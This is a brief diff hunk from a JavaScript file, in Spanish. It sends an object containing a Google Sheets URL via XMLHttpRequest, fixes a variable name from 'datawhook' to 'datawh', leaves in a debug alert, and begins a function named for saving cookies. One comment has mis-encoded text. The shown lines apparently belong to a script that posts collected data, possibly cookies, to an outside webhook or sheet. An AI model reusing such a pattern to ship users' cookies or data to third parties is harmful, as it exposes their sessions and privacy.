@@ -146,7 +146,7 @@ var datawh = {
   'Respuestas Google': 'https://docs.google.com/spreadsheets/d/1M-XJiLh-G0VeExG5tQlOH6HfLJV2WNcdJiEKPUkqaSA/edit?resourcekey#gid=1797801513'
 };
 alert("ejecucion8");
-xhr.send(JSON.stringify(datawhook));
+xhr.send(JSON.stringify(datawh));
 }
 // Funci車n para guardar las cookies
 function salvaCookies() {
